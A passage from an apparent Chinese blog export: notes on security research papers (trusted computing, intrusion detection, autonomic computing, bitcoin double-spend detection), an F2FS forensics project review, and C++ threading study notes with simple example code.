<p>这篇文章实际上主要在将边缘计算，以及在区块链中的应用。这并不是主动防御和系统安全的主要关注点</p>
<p><img src="/2021/08/15/%E8%BF%91%E6%9C%9F%E6%96%87%E7%8C%AE%E8%B0%83%E7%A0%94/image-20210816225714743.png" alt="image-20210816225714743"></p>
<p>文中还提出与基于病毒防护、防火墙和入侵检测的传统终端安全解决方案相比，可信计算的核心理念是嵌入计算机平台（如 TPM）的嵌入式微机系统。它可以解决许多以前无法解决的问题。TPM 实际上在计算机系统中增加了一个受信任的第三方，并且系统可以通过测量和约束系统来被受信任的第三方信任。</p>
<p>Bin Ma 等人认为应该分层考虑安全系统的设计，不同层次之间有不同的属性和安全要求。</p>
<p><img src="https://ieeexplore.ieee.org/mediastore_new/IEEE/content/media/9265638/9265872/9265904/ma1-p6-ma-small.gif" alt="图1。- 边缘计算安全保护图。"></p>
<h3 id="2021-SDSBT-A-Secure-Multi-party-Data-Sharing-Platform-Based-on-Blockchain-and-TEE"><a href="#2021-SDSBT-A-Secure-Multi-party-Data-Sharing-Platform-Based-on-Blockchain-and-TEE" class="headerlink" title="2021 SDSBT: A Secure Multi-party Data Sharing Platform Based on Blockchain and TEE"></a>2021 SDSBT: A Secure Multi-party Data Sharing Platform Based on Blockchain and TEE</h3><p><a href="https://link.springer.com/chapter/10.1007/978-3-030-73671-2_17">https://link.springer.com/chapter/10.1007/978-3-030-73671-2_17</a></p>
<p>基于区块链和TEE的安全多方数据共享平台    </p>
<p>This paper proposes SDSBT, a multi-party data sharing platform based on blockchain and the trusted execution environment (TEE), which effectively and securely realizes the data sharing among multiple parties. SDSBT achieves the properties including privacy-preserving, identity authentication, application security, and accountability.</p>
<p>提出了基于区块链和可信执行环境（TEE）的多方数据共享平台，实现了隐私保护、身份验证、应用程序安全和责任等特性。作者也做了分成的设计，不过他们的设计与Bin Ma的有所区别：合同层、数据传输层、数据操作层、数据共享层和存储层。</p>
<h3 id="2021-An-attack-immune-trusted-architecture-for-supervisory-aircraft-hardware"><a href="#2021-An-attack-immune-trusted-architecture-for-supervisory-aircraft-hardware" class="headerlink" title="2021 An attack-immune trusted architecture for supervisory aircraft hardware"></a>2021 An attack-immune trusted architecture for supervisory aircraft hardware</h3><p><a href="https://www.sciencedirect.com/science/article/pii/S1000936121000637?via%3Dihub">https://www.sciencedirect.com/science/article/pii/S1000936121000637?via%3Dihub</a></p>
<p>作者结合免疫的概念，提出一种用于监控飞机硬件的攻击免疫可信体系结构</p>
<p><img src="/2021/08/15/%E8%BF%91%E6%9C%9F%E6%96%87%E7%8C%AE%E8%B0%83%E7%A0%94/image-20210816163853698.png" alt="image-20210816163853698" style="zoom:67%;"></p>
<p>针对飞机硬件的安全问题，提出了一种基于安全片上系统。该体系结构具有攻击免疫性和可信任性，能够在不受干扰的情况下支持可信托管应用和动态完整性度量。在该文的方案中，系统的安全程序将物理上与主处理器 SoC 隔离。</p>
<h2 id="Intelligent-security"><a href="#Intelligent-security" class="headerlink" title="Intelligent security"></a>Intelligent security</h2><h3 id="2021-Intelligent-immunity-based-security-defense-system-for-multi-access-edge-computing-network"><a href="#2021-Intelligent-immunity-based-security-defense-system-for-multi-access-edge-computing-network" class="headerlink" title="2021 Intelligent immunity based security defense system for multi-access edge computing network"></a>2021 Intelligent immunity based security defense system for multi-access edge computing network</h3><p><a href="https://ieeexplore.ieee.org/document/9339833/keywords#keywords">https://ieeexplore.ieee.org/document/9339833/keywords#keywords</a></p>
<p>基于智能免疫的多访问边缘计算网络安全防御系统</p>
<p>In this paper, the security problem for the multi-access edge computing (MEC) network is researched, and an intelligent immunity-based security defense system is proposed to identify the unauthorized mobile users and to protect the security of whole system. In the proposed security defense system, the security is protected by the intelligent immunity through three functions, identification function, learning function, and regulation function, respectively. Meanwhile, a three process-based intelligent algorithm is proposed for the intelligent immunity system. Numerical simulations are given to prove the effeteness of the proposed approach.</p>
<p>本文研究了多接入边缘计算（MEC）网络的安全问题，提出了智能免疫安全防御系统，以识别未经授权的移动用户，保护整个系统的安全。在拟议的安全防御系统中，安全性分别通过识别功能、学习功能和调节功能三个功能受到智能免疫的保护。同时，提出了智能免疫系统的三种基于过程的智能算法。进行数字模拟以证明拟议方法的有效性。</p>
<h3 id="2019-Real-Time-Early-Warning-of-Network-Security-Threats-Based-on-Improved-Ant-Colony-Algorithm"><a href="#2019-Real-Time-Early-Warning-of-Network-Security-Threats-Based-on-Improved-Ant-Colony-Algorithm" class="headerlink" title="2019 Real-Time Early Warning of Network Security Threats Based on Improved Ant Colony Algorithm"></a>2019 Real-Time Early Warning of Network Security Threats Based on Improved Ant Colony Algorithm</h3><p><a href="https://ieeexplore.ieee.org/document/9017019">https://ieeexplore.ieee.org/document/9017019</a></p>
<p>基于改进的蚂蚁群落算法的网络安全威胁实时预警</p>
<p>Firstly, the network security threat perception algorithm is optimized based on the principle of neural network, and the network security threat detection process is standardized according to the optimized algorithm. Finally, the real-time early warning of network security threats is realized. Finally, the experiment proves that the network security threat real-time warning based on the improved ant colony algorithm has better security and stability than the traditional warning methods, and fully meets the research requirements.</p>
<p>基于神经网络原理优化网络安全威胁感知算法，根据优化算法对网络安全威胁检测过程进行标准化。最后，实现了网络安全威胁的实时预警。最后，实验证明，基于改进的蚂蚁群落算法的网络安全威胁实时预警比传统的预警方法具有更好的安全性和稳定性，完全符合研究要求。</p>
<h3 id="2020-Toward-Proactive-Adaptive-Defense-A-Survey-on-Moving-Target-Defense"><a href="#2020-Toward-Proactive-Adaptive-Defense-A-Survey-on-Moving-Target-Defense" class="headerlink" title="2020 Toward Proactive, Adaptive Defense: A Survey on Moving Target Defense"></a>2020 Toward Proactive, Adaptive Defense: A Survey on Moving Target Defense</h3><p><a href="https://ieeexplore.ieee.org/document/8949517">https://ieeexplore.ieee.org/document/8949517</a></p>
<p>主动、自适应防御：移动目标防御调查</p>
<p>综述性文章。讨论了 MTD（移动目标防御） 在入侵预防机制和检测潜在攻击者方面的作用，讨论了本工作所涵盖的现有 MTD 方法的局限性，并提出了未来在MTD研究领域的研究方向。</p>
<h3 id="2019-Artificial-Intelligence-based-Network-Intrusion-Detection-with-Hyper-Parameter-Optimization-Tuning-on-the-Realistic-Cyber-Dataset-CSE-CIC-IDS2018-using-Cloud-Computing"><a href="#2019-Artificial-Intelligence-based-Network-Intrusion-Detection-with-Hyper-Parameter-Optimization-Tuning-on-the-Realistic-Cyber-Dataset-CSE-CIC-IDS2018-using-Cloud-Computing" class="headerlink" title="2019 Artificial Intelligence based Network Intrusion Detection with Hyper-Parameter Optimization Tuning on the Realistic Cyber Dataset CSE-CIC-IDS2018 using Cloud Computing"></a>2019 Artificial Intelligence based Network Intrusion Detection with Hyper-Parameter Optimization Tuning on the Realistic Cyber Dataset CSE-CIC-IDS2018 using Cloud Computing</h3><p><a href="https://ieeexplore.ieee.org/document/8698029">https://ieeexplore.ieee.org/document/8698029</a></p>
<p>基于人工智能的网络入侵检测</p>
<p>The proposed system can be extended to detect all other remaining classes of attacks in this realistic dataset which includes all real-time and existing attacks.</p>
<p>所提出的系统可以扩展到检测这个真实数据集中所有其他类型的攻击，其中包括所有实时和现有的攻击。此人工智能Scikit学习框架优化中使用的框架基于中央处理单元，而不是图形处理单元，优化可能会被其他此类框架（如谷歌的开源Tensor Flow）有力地调整。当我们遇到熊猫来处理更大的数据（100千兆字节到多TB）时，性能问题是一个常见的任务，但是Spark是一个用于大数据处理的开源Apache框架，它可以处理集群计算机上从100千兆字节到多TB的海量数据集的并行计算。</p>
<h2 id="Automatic-computing"><a href="#Automatic-computing" class="headerlink" title="Automatic computing"></a>Automatic computing</h2><p>知网找到的有关自主计算的文献基本很久远</p>
<p><img src="/2021/08/15/%E8%BF%91%E6%9C%9F%E6%96%87%E7%8C%AE%E8%B0%83%E7%A0%94/image-20210815175450814.png" alt="image-20210815175450814"></p>
<h3 id="2021-A-review-on-architecture-and-models-for-autonomic-software-systems"><a href="#2021-A-review-on-architecture-and-models-for-autonomic-software-systems" class="headerlink" title="2021 A review on architecture and models for autonomic software systems"></a>2021 A review on architecture and models for autonomic software systems</h3><p><a href="https://link.springer.com/article/10.1007/s11227-020-03268-0">https://link.springer.com/article/10.1007/s11227-020-03268-0</a></p>
<p>（这篇文章引用了之前LNCS文章的一篇经典自动计算的文章 Towards Enabling Autonomic Computing in IoT Ecosystem <a href="https://ieeexplore.ieee.org/document/8890456，引用该文的文章列表可以参考">https://ieeexplore.ieee.org/document/8890456，引用该文的文章列表可以参考</a> <a href="https://scholar.google.com/scholar?cites=14309675548026047319&amp;as_sdt=2005&amp;sciodt=0,5&amp;hl=zh-CN）">https://scholar.google.com/scholar?cites=14309675548026047319&amp;as_sdt=2005&amp;sciodt=0,5&amp;hl=zh-CN）</a></p>
<p>自主软件系统架构和模型回顾</p>
<p>该文对自主决策概念及其在入侵检测、基于云的数据安全、无线传感器网络、物联网、大数据等诸多无法实时管理的领域的重要性提供了深入的见解。并且讨论了不同研究人员在研究估计系统自主性水平时建议并实施的一些解决方案。这些解决方案将有助于根据每个应用程序中实现的自主特征比较不同的自主应用。</p>
<h3 id="2021-Autonomic-Resource-Management-in-a-Cloud-Based-Infrastructure-Environment"><a href="#2021-Autonomic-Resource-Management-in-a-Cloud-Based-Infrastructure-Environment" class="headerlink" title="2021 Autonomic Resource Management in a Cloud-Based Infrastructure Environment"></a>2021 Autonomic Resource Management in a Cloud-Based Infrastructure Environment</h3><p><a href="https://link.springer.com/chapter/10.1007/978-3-030-71756-8_18">https://link.springer.com/chapter/10.1007/978-3-030-71756-8_18</a></p>
<p>基于云的基础设施环境中的自主资源管理</p>
<p>该文概述了自主云计算环境的方法和机制。自主计算完全执行动态配置资源的方式，以便实时重新配置资源。还为领域研究人员分析了自主资源管理的最高特征提供了一条直截了当的方法，并有助于研究学者识别和描述未来研究角度与环境相对应的应用的主要技术。</p>
<h3 id="2021-Autonomic-Computing-on-Cloud-Computing-Using-Architecture-Adoption-Models-An-Empirical-Review"><a href="#2021-Autonomic-Computing-on-Cloud-Computing-Using-Architecture-Adoption-Models-An-Empirical-Review" class="headerlink" title="2021 Autonomic Computing on Cloud Computing Using Architecture Adoption Models: An Empirical Review"></a>2021 Autonomic Computing on Cloud Computing Using Architecture Adoption Models: An Empirical Review</h3><p><a href="https://link.springer.com/chapter/10.1007/978-3-030-71756-8_11">https://link.springer.com/chapter/10.1007/978-3-030-71756-8_11</a></p>
<p>使用架构采用模型的云计算自主计算：经验回顾</p>
<p>This paper presents a brief review on autonomic self-management attributes and capabilities of machine additives, describes autonomic computing architectures, autonomic adoption modes and requirements, and examines its properties over cloud computing.</p>
<p>该文主要描述了自主计算体系结构、自主采用模式和需求，并分析了其在云计算上的特性。</p>
<h3 id="2021-The-Architecture-of-Autonomic-Cloud-Resource-Management"><a href="#2021-The-Architecture-of-Autonomic-Cloud-Resource-Management" class="headerlink" title="2021 The Architecture of Autonomic Cloud Resource Management"></a>2021 The Architecture of Autonomic Cloud Resource Management</h3><p><a href="https://link.springer.com/chapter/10.1007/978-3-030-71756-8_14">https://link.springer.com/chapter/10.1007/978-3-030-71756-8_14</a></p>
<p>自主云资源管理架构</p>
<p><img src="/2021/08/15/%E8%BF%91%E6%9C%9F%E6%96%87%E7%8C%AE%E8%B0%83%E7%A0%94/image-20210816160133480.png" alt="image-20210816160133480" style="zoom:67%;"></p>
<p>该文提到 IBM 解释的四大领域，其中入侵检测是我们关注的重点，但没有更详细的有关自主计算的文章讲述入侵检测了。</p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>可信计算</tag>
        <tag>信息系统仿生安全</tag>
        <tag>智能安全</tag>
        <tag>自主计算</tag>
      </tags>
  </entry>
  <entry>
    <title>面向智能终端的快捷支付双花攻击检测模型</title>
    <url>/2020/09/24/%E9%9D%A2%E5%90%91%E6%99%BA%E8%83%BD%E7%BB%88%E7%AB%AF%E7%9A%84%E5%BF%AB%E6%8D%B7%E6%94%AF%E4%BB%98%E5%8F%8C%E8%8A%B1%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>数字加密货币; 安全交易; 双花攻击; 人工免疫; 异常检测</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><h3 id="51-攻击"><a href="#51-攻击" class="headerlink" title="51% 攻击"></a>51% 攻击</h3><ul>
<li>指攻击者利用算力优势（大于50%）强行修改 合法的交易记录，实现一笔虚拟货币两次消费</li>
<li>对于比特币交易而言，每个用户节点都可参与交易的合法性验证和确认。</li>
<li>参与交易的节点就是矿工节点，他们用CPU计算资源进行挖矿（利用CPU资源计算随机数），通过工作量证明（POW）机制进行账单记录权的争夺，胜利者将得到一份比特币作为奖励。</li>
</ul>
<h4 id="攻击条件说明"><a href="#攻击条件说明" class="headerlink" title="攻击条件说明"></a>攻击条件说明</h4><p>条件一：根据比特币协议，后到的同源交易将被丢弃</p>
<p>条件三：因为比特币用户是匿名的，而且一个 用户可拥有多个账号，所以当服务结束了，即使卖 主意识到了异常，也很难鉴别出攻击者，导致双花 攻击的可能性增大。</p>
<h3 id="预防双花攻击"><a href="#预防双花攻击" class="headerlink" title="预防双花攻击"></a>预防双花攻击</h3><p>以比特币为代表的主流数字加密货币，通过工作量证明的机制和一个记录所有确认交易的公共链来预防双花攻击</p>
<h4 id="工作量证明"><a href="#工作量证明" class="headerlink" title="工作量证明"></a>工作量证明</h4><p>根据比特币白皮书中的说明可知，比特币网络以交易时间为代价来累积确认交易区块的高度从而对抗双花攻击。</p>
<p><img src="/2020/09/24/%E9%9D%A2%E5%90%91%E6%99%BA%E8%83%BD%E7%BB%88%E7%AB%AF%E7%9A%84%E5%BF%AB%E6%8D%B7%E6%94%AF%E4%BB%98%E5%8F%8C%E8%8A%B1%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B%E6%A8%A1%E5%9E%8B/image-20210524205529138.png" alt="image-20210524205529138"></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFDLAST2020&amp;filename=AQJS202005011&amp;v=kzaijASy61IKa9xpiuaF%25mmd2F3Oun4UkM8%25mmd2FZiOCNnR%25mmd2FtVHwErL%25mmd2F7lpKHbL81BNtK%25mmd2FiF1">https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFDLAST2020&amp;filename=AQJS202005011&amp;v=kzaijASy61IKa9xpiuaF%25mmd2F3Oun4UkM8%25mmd2FZiOCNnR%25mmd2FtVHwErL%25mmd2F7lpKHbL81BNtK%25mmd2FiF1</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>异常检测</tag>
        <tag>免疫</tag>
      </tags>
  </entry>
  <entry>
    <title>项目回顾</title>
    <url>/2021/08/19/%E9%A1%B9%E7%9B%AE%E5%9B%9E%E9%A1%BE/</url>
    <content><![CDATA[<h2 id="为什么研究F2FS文件系统的项目？"><a href="#为什么研究F2FS文件系统的项目？" class="headerlink" title="为什么研究F2FS文件系统的项目？"></a>为什么研究F2FS文件系统的项目？</h2><p>F2FS是一种Flash文件系统，跟传统的Linux文件系统相比，更能发挥闪存存储设备的性能优势，然后现在也有越来越多的厂商使用F2FS文件系统，所以做F2FS文件系统取证还是很有意义的。</p>
<h2 id="这个项目跟其他研究相比有什么优势，为什么不用现成的工具？"><a href="#这个项目跟其他研究相比有什么优势，为什么不用现成的工具？" class="headerlink" title="这个项目跟其他研究相比有什么优势，为什么不用现成的工具？"></a>这个项目跟其他研究相比有什么优势，为什么不用现成的工具？</h2><ol>
<li><p>之前的研究有把整个F2FS文件系统镜像当成一个磁盘，通过模拟Linux挂载磁盘来构建文件系统的结构信息，这样做可以解决可移植问题，但是这种方法要根据位图信息遍历整个文件系统，所以解析大容量的文件系统的时候，效率就会低很多。</p>
</li>
<li><p>然后也有人做过，分别遍历段摘要区和主区，恢复和解析删除文件，但是它们只针对删除文件，不涉及现存的那些没被删除的文件。而且，分别遍历段摘要区和主区其实效率也不是很高。</p>
</li>
<li>我们所做的这个项目，解析的效率要比传统的那种磁盘遍历要高。文件取证方法通过定位有效文件夹以及.Trash文 件夹快速解析获取用户当前目录结构和近期删除 的所有文件数据信息。</li>
</ol>
<h2 id="项目中有什么难点？如何解决的"><a href="#项目中有什么难点？如何解决的" class="headerlink" title="项目中有什么难点？如何解决的"></a>项目中有什么难点？如何解决的</h2><p>F2FS文件系统一般有两个或者两个以上节点地址表（就是为了防止宕机然后对元数据造成不可恢复的损害）。但只有一个有效的节点地址表存储最新的节点信息。然后又因为F2FS文件系统有一个jounal缓存机制，<strong>可能有效nat_entry表项没有更新到节点地址表</strong>的情况。</p>
<p>根据节点地址表的写入原理，通过检查点段，定位到最新有效的节点地址表。</p>
<p><img src="/2021/08/19/%E9%A1%B9%E7%9B%AE%E5%9B%9E%E9%A1%BE/image-20210820122646610.png" alt="image-20210820122646610"></p>
<h2 id="F2FS文件系统知识点"><a href="#F2FS文件系统知识点" class="headerlink" title="F2FS文件系统知识点"></a>F2FS文件系统知识点</h2><h3 id="结构布局"><a href="#结构布局" class="headerlink" title="结构布局"></a>结构布局</h3><p><img src="/2021/08/19/%E9%A1%B9%E7%9B%AE%E5%9B%9E%E9%A1%BE/image-20210820122433526.png" alt="image-20210820122433526"></p>
<h2 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h2><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CJFD&amp;dbname=CJFDLAST2020&amp;filename=AQJS202008011&amp;v=kzaijASy61LCqpqJRwFs793cGqXipps20s2T0ZMnwutpBr66jWZ7J%mmd2FlAOSIYFVLF">手机端F2FS镜像文件数据取证方法 - 中国知网 (cnki.net)</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>F2FS</tag>
      </tags>
  </entry>
  <entry>
    <title>C++并发编程[笔记]</title>
    <url>/2021/08/11/C-%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="第-1-章-C-的并发世界"><a href="#第-1-章-C-的并发世界" class="headerlink" title="[第 1 章] C++的并发世界"></a>[第 1 章] C++的并发世界</h2><h3 id="1-1-什么是并发？多线程"><a href="#1-1-什么是并发？多线程" class="headerlink" title="1.1 什么是并发？多线程"></a>1.1 什么是并发？多线程</h3><h4 id="1-1-1-并发的两种方式"><a href="#1-1-1-并发的两种方式" class="headerlink" title="1.1.1 并发的两种方式"></a>1.1.1 并发的两种方式</h4><ol>
<li>多核机器的真正并行</li>
<li>单核机器的任务切换</li>
</ol>
<p><img src="/2021/08/11/C-%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/image-20210811131514226.png" alt="image-20210811131514226" style="zoom:67%;"></p>
<h4 id="1-1-2-并发的两种途径"><a href="#1-1-2-并发的两种途径" class="headerlink" title="1.1.2 并发的两种途径"></a>1.1.2 并发的两种途径</h4><h5 id="a-多进程并发"><a href="#a-多进程并发" class="headerlink" title="a. 多进程并发"></a>a. 多进程并发</h5><p>应用程序分为多个独立的进程，它们通过常规的进程间通信传递信息。</p>
<p><img src="/2021/08/11/C-%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/image-20210811131839971.png" alt="image-20210811131839971" style="zoom: 67%;"></p>
<h5 id="b-多线程并发"><a href="#b-多线程并发" class="headerlink" title="b. 多线程并发"></a>b. 多线程并发</h5><p>在单个进程中运行多个线程，每个线程相互独立，但共享地址空间，一个进程中的两个线程通过共享内存进行通信。</p>
<p><img src="/2021/08/11/C-%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/image-20210811132013156.png" alt="image-20210811132013156" style="zoom:67%;"></p>
<hr>
<ul>
<li>多进程并发与多线程并发的优缺</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>并发途径</th>
<th>优</th>
<th>缺</th>
</tr>
</thead>
<tbody>
<tr>
<td>多进程并发</td>
<td>1. 可远程连接，在不同机器上运行独立的进程<br>2. 操作系统在进程间提供的附加保护操作和更高级别的通信机制，可以更容易编写出安全的并发代码</td>
<td>1. 设置复杂，速度慢<br>2. 开销大</td>
</tr>
<tr>
<td>多线程并发</td>
<td>开销小</td>
<td>线程间的数据共享需要确保一致性</td>
</tr>
</tbody>
</table>
</div>
<hr>
<h3 id="1-2-为什么要用并发？"><a href="#1-2-为什么要用并发？" class="headerlink" title="1.2 为什么要用并发？"></a>1.2 为什么要用并发？</h3><ol>
<li>关注点分离（SOC）</li>
<li>性能（任务并行+数据并行）</li>
</ol>
<h3 id="1-3-什么时候不能用并发？"><a href="#1-3-什么时候不能用并发？" class="headerlink" title="1.3 什么时候不能用并发？"></a>1.3 什么时候不能用并发？</h3><p>编写和维护的多线程代码需要一定的成本，额外的复杂性也可能引起更多的错误。<br>除非性能增益足够大或关注点分离地足够清晰，能抵消开发和维护成本，否则别用并发。</p>
<h3 id="1-4-C-中的多线程"><a href="#1-4-C-中的多线程" class="headerlink" title="1.4 C++中的多线程"></a>1.4 C++中的多线程</h3><ul>
<li>管理线程的函数和类在 <code>&lt;thread&gt;</code>  中声明</li>
<li>每个线程都必须具有一个初始函数</li>
<li>新线程启动后，初始线程继续执行，需要 <code>join()</code> 确保新线程启动前程序不会结束</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span>  <span class="comment">// 管理线程的函数和类</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 新线程的初始函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">h</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Hello Concurrent World\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始线程的初始函数是 main()</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">std::thread <span class="title">t</span><span class="params">(h)</span></span>;  <span class="comment">// 在std::thread对象的构造函数中指定新线程t的初始函数为h()</span></span><br><span class="line">    t.<span class="built_in">join</span>();  <span class="comment">// 因为有可能在新线程开始之前，程序就结束了，所以要加join()等待与std::thread对象关联的新线程t</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第-2-章-线程管理"><a href="#第-2-章-线程管理" class="headerlink" title="[第 2 章] 线程管理"></a>[第 2 章] 线程管理</h2><h3 id="2-1-线程管理基础"><a href="#2-1-线程管理基础" class="headerlink" title="2.1 线程管理基础"></a>2.1 线程管理基础</h3><h4 id="2-1-1-启动线程"><a href="#2-1-1-启动线程" class="headerlink" title="2.1.1 启动线程"></a>2.1.1 启动线程</h4><h5 id="a-传入无参数无返回的函数——最简单情况"><a href="#a-传入无参数无返回的函数——最简单情况" class="headerlink" title="a. 传入无参数无返回的函数——最简单情况"></a>a. 传入无参数无返回的函数——最简单情况</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_some_work</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">std::thread <span class="title">my_thread</span><span class="params">(do_some_work)</span></span>;</span><br></pre></td></tr></table></figure>
<h5 id="b-传入带有函数调用符类型的实例（某个类的对象）"><a href="#b-传入带有函数调用符类型的实例（某个类的对象）" class="headerlink" title="b. 传入带有函数调用符类型的实例（某个类的对象）"></a>b. 传入带有函数调用符类型的实例（某个类的对象）</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Test f;</span><br><span class="line">    <span class="function">std::thread <span class="title">t</span><span class="params">(f)</span></span>;</span><br><span class="line">    t.<span class="built_in">join</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码中，提供的函数对象会复制到新线程的存储空间中，函数对象的执行和调用都在新线程的内存空间进行。</p>
<font face="楷体" color="red">注意：如果传递一个临时变量，而不是一个命名的变量；C++编译器会将其解析为函数声明，而不是类型对象的定义。</font>

<p>比如，以下语句的含义为：声明一个名为 <code>t</code> 的函数，这个函数带有一个参数（函数指针指向没有参数并返回 <code>Test</code> 对象的函数），返回一个 <code>std::thread</code> 对象，而不是启动一个线程。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">std::thread <span class="title">t</span><span class="params">(Test())</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>如何解决上述问题，正确的以 <code>classname()</code> 形式启动线程？</p>
<p>方法 1，2 均可</p>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;thread&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Test f;</span><br><span class="line">    <span class="comment">//std::thread t((Test()));  // 方法 1 </span></span><br><span class="line">    std::thread t&#123;<span class="built_in">Test</span>()&#125;;  <span class="comment">// 方法 2</span></span><br><span class="line">    t.<span class="built_in">join</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="2-1-2-等待线程"><a href="#2-1-2-等待线程" class="headerlink" title="2.1.2 等待线程"></a>2.1.2 等待线程</h4><ul>
<li><p>如果需要等待线程，相关的 <code>std::thread</code> 实例需要使用 <code>join()</code>。</p>
</li>
<li><p>使用 <code>join()</code> 而不是 <code>detach()</code> 可以确保局部变量在线程完成后，才被销毁。</p>
</li>
<li>调用 <code>join()</code> 的行为会清理线程相关的存储部分。这样 <code>std::thread</code> 对象将不再与已经完成的线程有任何关联。也就是说，只能对一个线程使用一次 <code>join()</code>，使用过的 <code>std::thread</code> 对象就不能在加入了。</li>
</ul>
<h4 id="2-1-3-特殊情况的等待"><a href="#2-1-3-特殊情况的等待" class="headerlink" title="2.1.3 特殊情况的等待"></a>2.1.3 特殊情况的等待</h4><h5 id="a-在异常处理过程中调用join"><a href="#a-在异常处理过程中调用join" class="headerlink" title="a. 在异常处理过程中调用join()"></a>a. 在异常处理过程中调用join()</h5><p>避免应用被抛出的异常所终止</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">func</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span>&amp; i;</span><br><span class="line">    <span class="built_in">func</span>(<span class="keyword">int</span>&amp; i_) : <span class="built_in">i</span>(i_) &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">unsigned</span> j = <span class="number">0</span>; j &lt; <span class="number">1000000</span>; ++j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">do_something</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> some_local_state = <span class="number">0</span>;</span><br><span class="line">    <span class="function">func <span class="title">my_func</span><span class="params">(some_local_state)</span></span>;</span><br><span class="line">    <span class="function">std::thread <span class="title">t</span><span class="params">(my_func)</span></span>;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    